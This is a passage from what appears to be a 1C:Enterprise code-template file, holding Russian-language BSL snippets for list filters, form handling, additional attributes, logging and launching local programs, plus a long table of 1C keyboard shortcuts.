//ПравоеЗначение 	- значение отбора
//
Процедура УстановитьЭлементОтбораСписка(Список, ИмяПоля, ПравоеЗначение, ВидСравнения = Неопределено)
	
	ЭлементОтбора = Список.Отбор.Элементы.Добавить(Тип(""ЭлементОтбораКомпоновкиДанных""));
	ЭлементОтбора.ЛевоеЗначение    = Новый ПолеКомпоновкиДанных(ИмяПоля);
	ЭлементОтбора.ВидСравнения     = ?(ВидСравнения = Неопределено, ВидСравненияКомпоновкиДанных.Равно, ВидСравнения);
	ЭлементОтбора.Использование    = Истина;
	ЭлементОтбора.ПравоеЗначение   = ПравоеЗначение;
	ЭлементОтбора.РежимОтображения = РежимОтображенияЭлементаНастройкиКомпоновкиДанных.Недоступный;
	
КонецПроцедуры // УстановитьЭлементОтбораСписка()

//Изменяет элемент отбора динамического списка
//
//Параметры:
//Список         - обрабатываемый динамический список,
//ИмяПоля        - имя поля компоновки, отбор по которому нужно установить,
//ВидСравнения   - вид сравнения отбора, по умолчанию - Равно,
//ПравоеЗначение - значение отбора,
//Установить     - признак необходимости установить отбор
//
Процедура ИзменитьЭлементОтбораСписка(Список, ИмяПоля, ПравоеЗначение = Неопределено, Установить = Ложь, ВидСравнения = Неопределено)
	
	УдалитьЭлементОтбораСписка(Список, ИмяПоля);
	
	Если Установить Тогда
		УстановитьЭлементОтбораСписка(Список, ИмяПоля, ПравоеЗначение, ВидСравнения);
	КонецЕсли;
	
КонецПроцедуры // ИзменитьЭлементОтбораСписка()

&НаСервере
Процедура ПриСозданииНаСервере(Отказ, СтандартнаяОбработка)
	
	Если Параметры.Свойство(""<?""Имя Элемента Для Отбора (Слитно)"">"") Тогда
		ИзменитьЭлементОтбораСписка(Список, ""<?""Имя Элемента Для Отбора (Слитно)"">"", Параметры.<?""Имя Элемента Для Отбора (Слитно)"">, Истина);
		Элементы.<?""Имя Элемента Для Отбора (Слитно)"">.Видимость = Ложь;
	КонецЕсли;

КонецПроцедуры
"}
},
{0,
{"Открыть форму созданного но незаписанного",0,0,"","&НаКлиенте
Процедура СоздатьНовыйОбъект()
	
	ФормаОбъекта    = ПолучитьФорму(""Документ.ЗаказПокупателя.Форма.ФормаДокумента"");
	// Или справочник
	ФормаОбъекта    = ПолучитьФорму(""Справочник.Партнеры.Форма.ФормаЭлемента"");
	
	ДанныеФормы     = ФормаОбъекта.Объект;
	СоздатьНовыйОбъектНаСервере(ДанныеФормы);
	
	КопироватьДанныеФормы(ДанныеФормы, ФормаОбъекта.Объект);  
	ФормаОбъекта.Открыть();
	
КонецПроцедуры

&НаСервереБезКонтекста
Процедура СоздатьНовыйОбъектНаСервере(НовыйОбъект)
	НовыйОбъект.Дата    = ТекущаяДата();
	// Другой произвольный алгоритм
КонецПроцедуры"}
},
{0,
{"Убрать префикс и лидирующие нули",0,0,"","// Типовой ПрефиксацияОбъектовКлиентСервер.ПолучитьНомерНаПечать(РеквизитыДокумента.НомерСмены);
Функция ОбработатьНомерДокумента(ВходящийНомер)
	
	НомерБезПрефикса = Объект.ВходящийНомер; 
	Пока Найти(НомерБезПрефикса, ""0"") <> 1 Цикл
		НомерБезПрефикса = Сред(НомерБезПрефикса, 2); //удаляет лидирующие ненули
	КонецЦикла;
	
	НомерБезНулей = НомерБезПрефикса;
	Пока Найти(НомерБезНулей, ""0"") = 1 Цикл
		НомерБезНулей = Сред(НомерБезНулей, 2); //удаляет лидирующие нули
	КонецЦикла;
	
	Возврат НомерБезНулей;
	
КонецФункции"}
},
{0,
{"Значение Реквизита Типовое",0,0,"","ЗначениеРеквизита = УправлениеСвойствами.ЗначениеСвойства(ДокОбъект, ""МойРеквизит""); 

// В бсп 2.4 это методы УправлениеСвойствами.ЗначениеСвойства() и УправлениеСвойствами.ЗначенияСвойств(), УправлениеСвойствами.ПолучитьЗначенияСвойств() — устаревший методо
// УправлениеСвойствами.ЗаполнитьДополнительныеРеквизитыВФорме(ЭтотОбъект);

// ОМ -\ УправлениеСвойствами

// Возвращает значение дополнительного свойства объекта.
//
// Параметры:
//  Объект   - ЛюбаяСсылка - ссылка на объект, например, СправочникСсылка.Номенклатура,
//                           ДокументСсылка.ЗаказПокупателя, ...
//  Свойство - ПланВидовХарактеристикСсылка.ДополнительныеРеквизитыИСведения - ссылка на
//                           дополнительный реквизит, значение которого нужно получить.
//           - Строка - Имя дополнительного свойства.
//
// Возвращаемое значение:
//  Произвольный - любое значение, допустимое для свойства.
//
Функция ЗначениеСвойства(Объект, Свойство) Экспорт
	ПолучатьРеквизиты = УправлениеСвойствамиСлужебный.ЭтоОбъектМетаданныхСДополнительнымиРеквизитами(Объект.Метаданные());
	
	Результат = ЗначенияСвойств(Объект, ПолучатьРеквизиты, Истина, Свойство);
	Если Результат.Количество() = 1 Тогда
		Возврат Результат[0].Значение;
	КонецЕсли;
КонецФункции "}
},
{0,
{"Занят ли файл",0,0,"","Попытка
	ДД 	= Новый ДвоичныеДанные(ИмяФайла);
Исключение
	Сообщить(""Файл занят другим приложением!"");
КонецПопытки;"}
},
{0,
{"Горячие, или быстрые кнопки для пользователя 1С 8.3",0,0,"","Горячие, или быстрые кнопки для пользователя 1С 8.3	
	
Сочетания клавиш для документов	
Кнопка по умолчанию (нажатие вместо клика мышкой)	Ctrl + Enter
Выбор поля (альтернатива мыши)	F4
Прямой обход полей	Tab
Обратный обход полей	Shift + Tab
Сочетания клавиш для справочников 1С 8.3	
Новый элемент	Ins
Новая группа	Ctrl + F9
Изменить элемент	Shift + Enter
Просмотр элемента или группы	Alt + Д + Р
Копировать элемент или группу	F9
Пометить элемент/Снять пометку	Del
История значения	F5
Найти в дереве	Alt + Д + А
Перенести в другую группу	Ctrl + F5
Подчиненный справочник	Alt + Д + Ч
Горящие клавиши для программиста 1С	
Глобальные действия	
Создать новый документ	Ctrl + N
Открыть существующий документ	Ctrl + O
Активизировать поле поиска в командной панели	Ctrl + D
Открыть “Глобальный поиск по текстам”	Ctrl + Shift + F
Открыть “Результаты глобального поиска по текстам”	Ctrl + Shift + H
Запустить 1С:Предприятие без отладки	Ctrl + F5
Открыть окно “Конфигурация”	Ctrl + Shift + С
Обновить конфигурацию БД	F7
Открыть “Шаблоны текста”	Ctrl + Shift + T
Открыть встроенный “Калькулятор” системы 1С Предприятие 8.2	Ctrl + F2
Открыть “Свойства”	Alt + EnterCtrl + E
Открыть “Дополнительно”	Shift + Alt + Enter
Открыть “Служебные сообщения”	Ctrl + Alt + O
Закрыть “Служебные сообщения”	Ctrl + Shift + Z
Очистить служебные сообщения	Ctrl + Alt + Z
Открыть “Справку”	F1
Открыть “Содержание справки”	Shift + F1
Открыть “Индекс справки”	Shift + Alt + F1
Открыть “Поиск по справке”	Ctrl + Alt + F1
Открыть “Синтаксис-Помощник	Ctrl + Shift + F1
Поиск по индексу в “Синтаксис-Помощнике”	Ctrl + F1
Общие действия	
Удалить	Del
Добавить	Ins
Сохранить активный документ	Ctrl + S
Печать активного документа	Ctrl + P
Печать на текущий принтер	Ctrl + Shift + P
Копировать в буфер обмена	Ctrl + C Ctrl + Ins
Вырезать в буфер обмена	Ctrl + X Shift + Del
Вставить из буфера обмена	Ctrl + V Shift + Ins
Добавить к буферу обмена	Shift + Num+
Вычесть из буфера обмена	Shift + Num-
Выделить все	Ctrl + A
Отменить последнее действие	Ctrl + Z Alt + BackSpace
Вернуть отмененное действие	Ctrl + Y Shift + Alt + BackSpace
Найти	Ctrl + F
Найти следующий	F3
Найти следующий выделенный	Ctrl + F3
Найти предыдущий	Shift + F3
Найти предыдущий выделенный	Ctrl + Shift + F3
Заменить	Ctrl + H
Найти в дереве	Ctrl + T
Следующий элемент в результатах поиска и окне сообщений	F8
Предыдущий элемент в результатах поиска и окне сообщений	Shift + F8
Развернуть (узел дерева, группу табличного документа, группировку модуля)	Ctrl + Num+
Свернуть (узел дерева, группу табличного документа, группировку модуля)	Ctrl + Num-
Развернуть (узел дерева, группу табличного документа, группировку модуля) и все подчиненные	Ctrl + Alt + Num+
Свернуть (узел дерева, группу табличного документа, группировку модуля) и все подчиненные	Ctrl + Alt + Num-
Развернуть (все узлы дерева, группы табличного документа, группировки модуля)	Ctrl + Shift + Num+
Свернуть (все узлы дерева, группы табличного документа, группировки модуля)	Ctrl + Shift + Num-
Следующая страница	Ctrl + PgDn Ctrl + Alt + F
Предыдущая страница	Ctrl + PgUp Ctrl + Alt + B
Включить/выключить жирность	Ctrl + B
Включить/выключить курсив	Ctrl + I
Включить/выключить подчеркивание	Ctrl + U
Переход к предыдущей главе справки	Alt + Left
Переход к следующей главе справки	Alt + Right
Управление окнами	
Закрыть активное окно, модальный диалог или приложение	Alt + F4
Закрыть активное обычное окно	Ctrl + F4
Закрыть активное окно (кроме обычных)	Shift + Esc
Активизировать следующее обычное окно	Ctrl + Tab Ctrl + F6
Активизировать предыдущее обычное окно	Ctrl + Shift + Tab Ctrl + Shift + F6
Активизировать следующую секцию окна	F6
Активизировать предыдущую секцию окна	Shift + F6
Вызвать системное меню приложения или модального диалога	Alt + Space
Вызвать системное меню окна (кроме модальных диалогов)	Alt + Hyphen(-) Alt + Num-
Вызвать главное меню	Alt F10
Вызвать контекстное меню	Shift + F10
Переход по истории активности окон	
Переместиться назад	Ctrl + “-”
Переместиться вперед	Ctrl + Shift + “-”
Вернуть активность обычному окну	Esc
Форма	
Перейти к следующему элементу формы/выполнить действие кнопки по умолчанию	Enter
Выполнить действие кнопки по умолчанию	Ctrl + Enter
Перейти к следующему элементу формы	Tab
Вернуться к предыдущему элементу формы	Shift + Tab
Активизировать командную панель, связанную с активным элементом управления/формой	Alt + F10
Открыть “Список элементов управления формы”	Ctrl + Shift + L
Перемещение по элементам управления, объединенным в одну группу	Up, Down, Left, Right
Работа со списком и деревом	
Открыть	F2
Обновить	Ctrl + Shift + R
Скопировать	F9
Новая группа	Ctrl + F9
Удалить строку	Shift + Del
Перемещение строки вверх	Ctrl + Shift + Up
Перемещение строки вниз	Ctrl + Shift + Down
Перенести элемент в другую группу	Ctrl + Shift + M
Перейти на уровень вниз с одновременным раскрытием группы	Ctrl + Down
Перейти на уровень вверх (к “родителю”)	Ctrl + Up
Закончить редактирование	Shift + F2
Развернуть узел дерева	Num+ Ctrl + Num+
Свернуть узел дерева	Num- Ctrl + Num-
Развернуть узел дерева и все подчиненные	Num* Ctrl + Alt + Num+
Свернуть узел дерева и все подчиненные	Ctrl + Alt + Num-
Развернуть все узлы дерева (выполняется в любом месте дерева)	Ctrl + Shift + Num+
Свернуть все узлы дерева (выполняется в любом месте дерева)	Ctrl + Shift + Num-
Изменение флажка	Пробел
Поле ввода	
Переключить режим вставки/замены	Ins
Кнопка выбора	F4
Кнопка открытия	Ctrl + Shift + F4
Очистить поле	Shift + F4
Удалить символ слева от курсора	BackSpace
Удалить символ справа от курсора	Del
Удалить слово слева от курсора	Ctrl + BackSpace
Удалить слово справа от курсора	Ctrl + Del
Перейти в начало строки	Home
Перейти в конец строки	End
Поле картинки	
Увеличить масштаб	Num+
Уменьшить масштаб	Num-
Прокрутить	Up, Down, Left, Right
Прокрутить на размер окна вверх	Page Up
Прокрутить на размер окна вниз	Page Down
Прокрутить на размер окна влево	Alt + PgUp
Прокрутить на размер окна вправо	Alt + PgDn
Редактор управляемых форм	
Переключиться на закладку “Форма”	Alt + 1
Переключиться на закладку “Модуль”	Alt + 2
Переключиться на закладку “Форма” и активизировать закладку “Элементы”	Alt + 3
Переключиться на закладку “Форма” и активизировать закладку “Реквизиты”	Alt + 4
Переключиться на закладку “Форма” и активизировать закладку “Команды”	Alt + 5
Переключиться на закладку “Форма” и активизировать закладку “Командный интерфейс”	Alt + 6
Переключиться на закладку “Форма” и активизировать закладку “Параметры”	Alt + 7
Переключиться на закладку “Форма” и активизировать окно предварительного просмотра формы	Alt + 8
Редактор форм	
Протестировать форму	Ctrl + R
Переместить элемент управления	Up, Down, Left, Right
Копировать элемент управления	Ctrl + (Up, Down, Left, Right)
Копировать элемент управления с инверсией выравнивания по сетке	Ctrl + Alt + (Up, Down, Left, Right)
Изменить размер элемента управления	Shift + (Up, Down, Left, Right)
Изменить размер элемента управления с инверсией выравнивания по сетке	Shift + Alt + (Up, Down, Left, Right)
Инверсия использования сетки	Alt + (Up, Down, Left, Right)
Открыть окно “Привязка границ для элемента…”	Ctrl + Shift + S
Начало редактирования	F2
Редактор табличных документов	
Перейти к ячейке	Ctrl + G
Перемещение по ячейкам	Up, Down, Left, Right
Перемещение по ячейкам к следующей заполненной или пустой	Ctrl + (Up, Down, Left, Right)
Перемещение по ячейкам к следующей заполненной или пустой с выделением ячеек	Ctrl + Shift + (Up, Down, Left, Right)
Выделение ячеек	Shift + (Up, Down, Left, Right)
Выделение ячеек от текущей до начала строки	Shift + Home
Выделение ячеек от текущей до конца строки	Shift + End
Выделение строк	Alt + Shift + (Up, Down)
Выделение строк до следующей заполненной или пустой ячейки	Ctrl + Alt + Shift + (Up, Down)
Выделение колонок	Alt + Shift + (Left, Right)
Выделение колонок до следующей заполненной или пустой ячейки	Ctrl + Alt + Shift + (Left, Right)
Выделение ячеек от текущей до начала документа	Ctrl + Shift + Home
Выделение ячеек от текущей до конца документа	Ctrl + Shift + End
Прокрутить на страницу вверх	PgUp
Прокрутить на страницу вниз	PgDn
Прокрутить на страницу влево	Alt + PgUp
Прокрутить на страницу вправо	Alt + PgDn
Перейти к редактированию содержимого ячейки	Enter
Переключение режима редактирования/ввода в ячейке	F2
Перейти в начало строки	Home
Перейти в конец строки	End
Перейти в начало текста	Ctrl + Home
Перейти в конец текста	Ctrl + End
Установка имени текущей области	Ctrl + Shift + N
Редактор текстовых документов и модулей	
Переключить режим вставки/замены	Ins
Перейти в начало строки	Home
Перейти в конец строки	End
Выделить до начала строки	Shift + Home
Выделить до конца строки	Shift + End
Перейти в начало текста	Ctrl + Home
Перейти в конец текста	Ctrl + End
Выделить до начала текста	Ctrl + Shift + Home
Выделить до конца текста	Ctrl + Shift + End
Прокрутить на одну строку вверх	Ctrl + Up
Прокрутить на одну строку вниз	Ctrl + Down
Перейти к началу предшествующего слова	Ctrl + Left
Перейти к началу следующего слова	Ctrl + Right
Выделить слово	Ctrl + W
Выделить предшествующее слово	Ctrl + Shift + Left
Выделить следующее слово	Ctrl + Shift + Right
Прокрутить на страницу вверх	PgUp
Прокрутить на страницу вниз	PgDn
Выделить предыдущую страницу текста	Shift + PgUp
Выделить следующую страницу текста	Shift + PgDn
Снять выделение	Esc
Перейти к строке	Ctrl + G
Удалить символ слева от курсора	BackSpace
Удалить символ справа от курсора	Del
Удалить слово слева от курсора	Ctrl + BackSpace
Удалить слово справа от курсора	Ctrl + Del
Установить/снять закладку	Alt + F2
Следующая закладка	F2
Предыдущая закладка	Shift + F2
Удалить текущую строку	Ctrl + L
Форматировать блок	Shift + Alt + F
Добавить комментарий	Ctrl + Num/
Удалить комментарий	Ctrl + Shift + Num/
Сдвинуть блок вправо	Tab
Сдвинуть блок влево	Shift + Tab
Синтаксический контроль	Ctrl + F7
Процедуры и функции модуля	Ctrl + Alt + P
Перейти к объявлению процедуры или переменной	F12
Контекстная подсказка	Ctrl + Пробел
Свернуть группу (курсор может быть в любом месте группы)	Ctrl + Num —
Развернуть группу (курсор может быть в любом месте группы)	Ctrl + Num +
Свернуть все группы	Ctrl + Shift + Num —
Развернуть все группы	Ctrl + Shift + Num +
Обновить группировки	Ctrl+ Shift + R
Активизация шаблона	Ctrl + Q
Перейти по операторным скобкам назад	Ctrl + [
Перейти по операторным скобкам вперед	Ctrl + ]
Перейти по операторным скобкам назад с выделением текста	Ctrl + Shift + [
Перейти по операторным скобкам вперед с выделением текста	Ctrl + Shift + ]
Отладчик	
Начать/продолжить отладку	F5
Перезапуск приложения для отладки	Ctrl + Shift + F5
Прекратить отладку	Shift + F5
Шагнуть в	F11
Шагнуть через	F10
Шагнуть из	Shift + F11
Идти до курсора	Shift + F10
Установить/снять точку останова	F9
Отключить/включить точку останова	Ctrl + Shift + F9
Список точек останова	Alt + F9
Вычислить выражение	Shift + F9
Открыть табло	Ctrl + Alt + W
Открыть стек вызовов	Ctrl + Alt + C
Редактор картинок	
Переключение картинка/коллекция	Ctrl + K
Параметры картинки/коллекции	Shift + Alt + P
Отразить слева направо	Ctrl + H
Отразить сверху вниз	Ctrl + Shift + H
Выделение прямоугольником	Shift + Alt + S
Масштаб	Ctrl + M
Ластик	Ctrl + Shift + E
Заливка	Ctrl + Shift + F
Карандаш	Ctrl + Shift + I
Кисть	Ctrl + Shift + B
Линия	Ctrl + Shift + L
Кривая	Shift + Alt + С
Аэрограф	Ctrl + Shift + A
Текст	Shift + Alt + T
Увеличение масштаба	Ctrl + Num+
Уменьшение масштаба	Ctrl + Num-
Палитра свойств	
Сохранить свойства	Enter
Восстановить значения свойства	Esc
Раскрыть категорию свойств	Num+
Закрыть категорию свойств	Num-
Перейти в начало палитры	Home
Перейти в конец палитры	End
Перейти к предыдущему свойству	Up
Перейти к следующему свойству	Down
Прокрутить на страницу вверх	PgUp
Прокрутить на страницу вниз	PgDn
Перейти к предыдущей категории	Ctrl + PgUp
Перейти к следующей категории	Ctrl + PgDn
Редактор карты маршрута	
Перейти на следующий элемент карты	Tab
Перейти на предыдущий элемент карты	Shift + Tab
Уменьшить ширину элемента карты	Shift + (Left)
Увеличить ширину элемента карты	Shift + (Right)
Уменьшить высоту элемента карты	Shift + (Up)
Увеличить высоту элемента карты	Shift + (Down)
Перемещение выделенного варианта вверх (только при выделенном варианте в элементе “Выбор варианта”)	Ctrl + (Up)
Перемещение выделенного варианта вниз (только при выделенном варианте в элементе “Выбор варианта”)	Ctrl + (Down)
Поиск	Ctrl + F
Найти следующий	F3
Найти предыдущий	Shift + F3
Замена	Ctrl + H
Конфигурация	
Открыть конфигурацию	Alt + К + Enter
Поиск во всех текстах	Alt + К + Т
Объединение конфигураций	Alt + К + О
Загрузить измененную конфигурацию	Alt + K + З
Конвертирование данных	Alt + К + Е
Администрирование	
Пользователи	Alt + А + П
Сохранить данные	Alt + А + Х
Восстановить данные	Alt + А + В
Выгрузить данные	Alt + А + Ы
Загрузить данные	Alt + А + Г
Настройка журнала регистрации	Alt + А + Н
Распределенная ИБ	Alt + А + Р
Управление	Alt + А + Р + У
Автообмен	Alt + А + Р + А
Действия	
Открыть в отладчике	Alt + Д + Т
Синтаксический контроль запросов	Alt + Д + К
Синтаксический контроль	Alt + Д + И
Процедуры и функции модуля	Alt + Д + Р
Файл	
Новый	Ctrl + N
Открыть	Ctrl + O
Сохранить	Ctrl + S
Печать	Ctrl + P
Сравнить файлы	Alt + Ф + Р
Закрыть	Alt + Ф + З
Просмотр	Alt + Ф + Р + Р + Enter
Параметры страницы	Alt + Ф + М
Работа с закладками	
Предыдущая закладка	Shift + F2
Закладка	Alt + F2
Следующая закладка	F2
Работа с блоком	
Форматировать	Ctrl + Shift +F
Сдвинуть вправо	Tab
Сдвинуть влево	Shift + Tab
Добавить комментарий	Ctrl + Num /
Удалить комментарий	Ctrl + Shift + Num /
Окна	
Закрыть окно	Ctrl + F4
Следующее окно	Ctrl + Shift + F6
Предыдущее окно	Ctrl + F6
Каскадом	Alt + О + К
Закрыть окно сообщений	Ctrl + Shift + z
Следующая страница	Ctrl + Alt + F
Предыдущая страница	Ctrl + Alt + B
Разделить окно	Alt + О + Р
Поиск и замена	
Заменить	Ctrl + Shift + F3
Искать	Ctrl + F3
Повторить поиск	F3
Искать назад	Alt + F3
Искать вперед	Shift + F3
Переход к строке	Ctrl + Shift + L
Сервис	
Калькулятор	Ctrl + F2
Синтаксис помощник	Alt + С + С
Настройка шаблонов	Alt + С + Н
Временная блокировка	Alt + С + В
Запуск предприятия	F11
Запуск отладчика	F12
Помощь	
Помощь	F1
Содержание	Shift + F1
Поиск в Синтаксис-Помощнике	Ctrl + F1
О программе	Alt + П + О
Общие	
Свойства	Alt + Enter
Выход	Alt + F4
Предприятие	
Документ	
Кнопка по умолчанию	Ctrl + Enter
Выбор поля (альтернатива мыши)	F4
Прямой обход полей	Tab
Обратный обход полей	Shift + Tab
Справочник Действия	
Новый элемент	Ins
Новая группа	Ctrl + F9
Изменить элемент	Shift + Enter
Просмотр элемента или группы	Alt + Д + Р
Копировать элемент или группу	F9
Пометить элемент/Снять пометку	Del
История значения	F5
Найти в дереве	Alt + Д + А
Перенести в другую группу	Ctrl + F5
Подчиненный справочник	Alt + Д + Ч
Сортировка	
Сортировка справочника по коду	Ctrl + 1
Сортировка справочника по наименованию	Ctrl + 2
Сортировка справочника по реквизиту	Ctrl + 3
На уровень вверх	Ctrl + стрелка вверх
На уровень вниз	Ctrl + стрелка вниз
"}
},
{0,
{"Загрузить дополнительные реквизиты номенклатуры",0,0,"","//Загрузить дополнительные реквизиты номенклатуры (http://mikuslas.ru/dop_rekvizity)

//Обработкой ЗагрузкаДанныхИзТабличногоДокумента - УФ

//Откроем событие «При записи объекта» и добавим туда код:

Объект.ДополнительныеРеквизиты.Очистить(); // Предварительно удаляем все доп. реквизиты. Если не нужно - закомментировать.

ДопСвойства = Новый Соответствие;
ДопСвойства.Вставить(""11"", 91); // Наименование свойства, номер ячейки
ДопСвойства.Вставить(""АКЦИЯ"", 92);
ДопСвойства.Вставить(""Размер,мм"", 93);
ДопСвойства.Вставить(""Формат"", 94);

Для Каждого ЭлементДопСвойства Из ДопСвойства Цикл

	//ИмяСвойства = ЭлементДопСвойства.Ключ + "" ("" + """"""Общие"""""" + "")""; // Это если риквизит Общий
	ИмяСвойства = ЭлементДопСвойства.Ключ + "" ("" + Объект.ВидНоменклатуры + "")"";
	
    ТекСвойство = ПланыВидовХарактеристик.ДополнительныеРеквизитыИСведения.НайтиПоНаименованию(ИмяСвойства, Ложь);
	ТекЗначениеДляСвойства = ТекстыЯчеек[ЭлементДопСвойства.Значение];
	//ТекЗначение = ТекЗначениеДляСвойства; // Это если нужно само значение из ячейки, т.е. простого типа
    ТекЗначение = Справочники.ЗначенияСвойствОбъектов.НайтиПоНаименованию(ТекЗначениеДляСвойства, Ложь);
	
	Если Не ЗначениеЗаполнено(ТекСвойство) Тогда
        Сообщить(""Не удалось найти свойство: """""" + ИмяСвойства + """""""");
        Продолжить;
    КонецЕсли;
    Если Не ЗначениеЗаполнено(ТекЗначение) Тогда
        Сообщить(""Создаем новое значение """""" + ТекстыЯчеек[ЭлементДопСвойства.Значение] + """""" для свойства """""" + ТекСвойство + """""""");
        НовоеЗначение = Справочники.ЗначенияСвойствОбъектов.СоздатьЭлемент();
        НовоеЗначение.Владелец = ТекСвойство;
        НовоеЗначение.Наименование = ТекстыЯчеек[ЭлементДопСвойства.Значение];
        НовоеЗначение.Записать();
        ТекЗначение = НовоеЗначение.Ссылка;
    КонецЕсли;

    МассивСтрок = Объект.ДополнительныеРеквизиты.НайтиСтроки(Новый Структура(""Свойство"", ТекСвойство));
    Если МассивСтрок.Количество() = 0 Тогда
        ДопРеквизит = Объект.ДополнительныеРеквизиты.Добавить();
    Иначе
        ДопРеквизит = МассивСтрок[0];
    КонецЕсли;
    ДопРеквизит.Свойство = ТекСвойство;
    ДопРеквизит.Значение = ТекЗначение;

КонецЦикла;

Объект.Записать();

//В соответствие «ДопСвойста» нужно вставить столько записей, сколько требуется загрузить дополнительных реквизитов. В качестве ключа указываем текстовое наименование дополнительного реквизита, а в качестве значения - номе строки табличного документа, где это значение храниться."}
},
{0,
{"Загрузить дополнительные реквизиты номенклатуры для Общие",0,0,"","//Загрузить дополнительные реквизиты номенклатуры (http://mikuslas.ru/dop_rekvizity)

//Обработкой ЗагрузкаДанныхИзТабличногоДокумента - УФ

//Откроем событие «При записи объекта» и добавим туда код:

//Объект.ДополнительныеРеквизиты.Очистить(); // Предварительно удаляем все доп. реквизиты. Если не нужно - закомментировать.

ДопСвойства = Новый Соответствие;
ДопСвойства.Вставить(""Цена для сайта"", 2); // Наименование свойства, номер ячейки

Для Каждого ЭлементДопСвойства Из ДопСвойства Цикл
	
	//ИмяСвойства 			= ЭлементДопСвойства.Ключ + "" ("" + """"""Общие"""""" + "")""; // Это если риквизит Общий
	ИмяСвойства 			= ЭлементДопСвойства.Ключ + "" ("" + Объект.ВидНоменклатуры + "")""; 
	
	ТекСвойство 			= ПланыВидовХарактеристик.ДополнительныеРеквизитыИСведения.НайтиПоНаименованию(ИмяСвойства, Ложь);
	ТекЗначениеДляСвойства 	= ТекстыЯчеек[ЭлементДопСвойства.Значение];
	//ТекЗначение 			= ТекЗначениеДляСвойства; // Это если нужно само значение из ячейки, т.е. простого типа
	ТекЗначение 			= Справочники.ЗначенияСвойствОбъектов.НайтиПоНаименованию(ТекЗначениеДляСвойства, Ложь);
	
	Если Не ЗначениеЗаполнено(ТекСвойство) Тогда
		Сообщить(""Не удалось найти свойство: """""" + ИмяСвойства + """""""");
		Продолжить;
	КонецЕсли;
	
	МассивСтрок = Объект.ДополнительныеРеквизиты.НайтиСтроки(Новый Структура(""Свойство"", ТекСвойство));
	Если МассивСтрок.Количество() = 0 Тогда
		ДопРеквизит = Объект.ДополнительныеРеквизиты.Добавить();
	Иначе
		ДопРеквизит = МассивСтрок[0];
	КонецЕсли;
	ДопРеквизит.Свойство 	= ТекСвойство;
	ДопРеквизит.Значение 	= ТекЗначение;
	
КонецЦикла;

//Объект.Записать();
"}
},
{0,
{"Лог",0,0,"","//Процедура сообщения и логирования 
//-------------------------------------------------------------------------
//Параметры:
//		пСобытие 	- Строка 	- Сообщение для выдачи или записи
//		ОсновныеПараметры 	- Структура 	- ВИмяФайлаЛога
//-------------------------------------------------------------------------
//автор: КучеровРМ 06.11.2018 (тактично позаимствована из модуля Битрикс)
Процедура СообщитьПодробно(пСобытие, ОсновныеПараметры = Неопределено, Логирование = Истина, ЗаписьВЖурналРегистрации = Ложь) Экспорт
	
	#Если Клиент Тогда
		Сообщить(пСобытие);
	#КонецЕсли
	
	Если ЗаписьВЖурналРегистрации Тогда
		ЗаписьЖурналаРегистрации(""АйТи_Логирование"", УровеньЖурналаРегистрации.Информация,,, пСобытие);
	КонецЕсли;
	
	Если Логирование И ОсновныеПараметры <> Неопределено Тогда
		
		Если ОсновныеПараметры.ИмяФайлаЛога <> """" Тогда
			
			Попытка
				
				Текст = Новый ЗаписьТекста(ОсновныеПараметры.ИмяФайлаЛога, КодировкаТекста.ANSI,, Истина);
				Текст.ЗаписатьСтроку(Строка(ТекущаяДата()) + ""--"" + пСобытие);
				Текст.Закрыть();	
				
			Исключение
				Сообщить(""Ошибка: "" + ОписаниеОшибки(), СтатусСообщения.Важное);
			КонецПопытки; 
			
		КонецЕсли;
	КонецЕсли;
	
КонецПроцедуры

СообщитьПодробно(""Не удалось записать договор контрагента. "" + ОписаниеОшибки(), ПараметрыОбмена);"}
},
{0,
{"RunFileFromCMD",0,0,"","'Window - параметры запуска окна:
'0 Hides the window and activates another window.
'1 Activates and displays a window. If the window is minimized or maximized, the system restores it to its original size and position. An application should specify this flag when displaying the window for the first time.
'2 Activates the window and displays it as a minimized window.
'3 Activates the window and displays it as a maximized window.
'4 Displays a window in its most recent size and position. The active window remains active.
'5 Activates the window and displays it in its current size and position.
'6 Minimizes the specified window and activates the next top-level window in the Z order.
'7 Displays the window as a minimized window. The active window remains active.
'8 Displays the window in its current state. The active window remains active.
'9 Activates and displays the window. If the window is minimized or maximized, the system restores it to its original size and position. An application should specify this flag when restoring a minimized window.
'10 Sets the show-state based on the state of the program that started the application.

'Флаг ожидания завершения приложение. 0- без ожидания завершения. 1 — ожидать завершение выполнения.

Процедура RunFileFromCMD(ЗапускаемаяПрограмма, Аргументы = """", ЗапускаемыйФайл = """", ДописатьВКонец = """", ВидОкна = 1, ОжиданиеЗавершения = 1)
	
	WshShell = Новый COMОбъект(""Wscript.Shell"");
    
    Команда = """""""" + ЗапускаемаяПрограмма + """""""";
    Если НЕ ПустаяСтрока(ЗапускаемыйФайл) Then
        Команда = Команда + "" "" + """""""" + ЗапускаемыйФайл + """""""";
    КонецЕсли;
    Если НЕ ПустаяСтрока(Аргументы) Тогда
        Команда = Команда + "" """""" + Аргументы + """""""";
    КонецЕсли;    
    Если НЕ ПустаяСтрока(ДописатьВКонец) Тогда
        Команда = Команда + "" "" + ДописатьВКонец;
    КонецЕсли;
    
    WshShell.Run(Команда, ВидОкна, ОжиданиеЗавершения);
	
КонецПроцедуры

&НаКлиенте
Функция ExecFileFromCMD(ЗапускаемаяПрограмма, Аргументы = """", ЗапускаемыйФайл = """", ДописатьВКонец = """")
	
	WshShell = Новый COMОбъект(""Wscript.Shell"");
    
    Команда = """""""" + ЗапускаемаяПрограмма + """""""";
    Если НЕ ПустаяСтрока(ЗапускаемыйФайл) Тогда
        Команда = Команда + "" "" + """""""" + ЗапускаемыйФайл + """""""";
    КонецЕсли;
    Если НЕ ПустаяСтрока(Аргументы) Тогда
        Команда = Команда + "" """""" + Аргументы + """""""";
    КонецЕсли;
    Если НЕ ПустаяСтрока(ДописатьВКонец) Тогда
        Команда = Команда + "" "" + ДописатьВКонец;
    КонецЕсли;
    
    WshExec = WshShell.Exec(Команда);
    
    InStream = WshExec.StdIn;
    //InStream.WriteLine(""cd D:"");
    Возврат WshExec.StdOut.ReadAll(); // Прочитать весь текст из командного окна
    
КонецФункции

Пример:
ПутьПриложения 			= ""C:\Users\Python\Python35\python.exe"";
ПутьЗапускаемогоФайла 	= ""D:\Disk_D\CODING\python\Run Matlab Function\Run myFunction.py"";
Аргументы 				= ""5.1"";
    
ExecFileFromCMD(ПутьПриложения, Аргументы, ПутьЗапускаемогоФайла);
"}
},
{0,
{"РольДоступна",0,0,"РольД[оступна]","РольДоступна(""<?""Имя роли (Слитно)"">"")"}
},
{0,
{"ПраваДоступны",0,0,"РольД[оступна]","Для каждого Роль Из Метаданные.Роли Цикл
	
